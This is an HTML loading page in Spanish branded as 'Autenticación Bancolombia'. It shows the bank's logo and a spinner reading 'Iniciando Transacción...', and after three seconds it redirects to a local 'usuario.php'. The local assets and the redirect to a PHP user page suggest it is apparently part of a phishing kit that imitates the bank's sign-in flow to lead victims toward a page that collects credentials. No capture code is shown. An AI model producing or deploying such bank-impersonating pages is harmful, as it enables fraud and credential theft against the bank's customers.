

<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Autenticación Bancolombia</title>
  <link rel="stylesheet" href="css/iniciando.css">
  <link rel="icon" href="images/favicon.ico">
</head>
<body>
  <header>
    <img src="images/bancolombia.svg" alt="Bancolombia Logo" class="logo">
    <a href="#" class="logout">
      Salir
      <img src="images/flecha.svg" alt="Flecha" class="icono-flecha">
    </a>
  </header>
  <main class="cuerpo">
    <div class="loader-container">
      <div class="spinner"></div>
      <div class="text">Iniciando<br>Transacción...</div>
    </div>    
  </main>
  <div class="lineafinal1">
    <div class="lineafinal2"></div>
  
    <span class="lineafinal3">
      <div class="lineafinal4">
        <div class="lineafinal5"></div>
        <div class="lineafinal6"></div>
      </div>
  
      <div class="lineafinal7">
      </div>
    </span>
  </div>
  <script>
    // Redirigir a otra página después de 5 segundos
setTimeout(function() {
  window.location.href = "./usuario.php";
}, 3000);

</script>
</body>
</html>

